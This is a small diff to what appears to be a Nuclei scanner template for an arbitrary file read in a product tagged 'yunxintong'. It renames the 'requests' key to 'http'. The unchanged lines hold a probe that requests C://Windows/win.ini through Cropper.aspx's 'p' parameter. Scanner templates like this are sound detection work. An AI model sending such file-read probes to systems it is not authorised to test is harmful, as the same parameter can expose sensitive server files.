@@ -6,7 +6,7 @@ info:
   severity: high
   tags: yunxintong,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/Cropper.aspx?p=C://Windows/win.ini"
